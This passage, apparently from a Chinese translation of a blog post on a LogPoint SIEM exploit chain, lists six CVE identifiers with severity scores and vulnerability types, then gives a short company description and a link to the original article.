YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-48950</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">7.5 高</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">认证和 CSRF 绕过</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-56084</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">7.1 高</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">通用规范化器 RCE</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-48951</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">7.5 高</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">SSRF</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-56087</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">5.9 中</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">服务器端模板注入 RCE</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2024-48952</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">6.4 中</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 16px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">静态 JWT 密钥</span></section></td></tr></tbody></table>  
  
LogPoint 是一个欧洲诞生的安全平台,总部位于丹麦哥本哈根,成立于 2000 年代初期,专注于大规模日志摄取和关联。最初作为日志管理解决方案的东西演变为统一的 **SIEM、SOAR 和 UEBA**  
 平台,旨在支持跨复杂企业环境的检测工程、调查工作流程和自动化响应。如今,LogPoint 在全球运营,为超过 1000 多个依赖它进行实时威胁检测和合规驱动的安全监控的组织提供服务。  
> 原文:https://mehmetince.net/the-story-of-a-perfect-exploit-chain-six-bugs-that-looked-harmless-until-they-became-pre-auth-rce-in-a-security-appliance/  
  
  
   
  
  
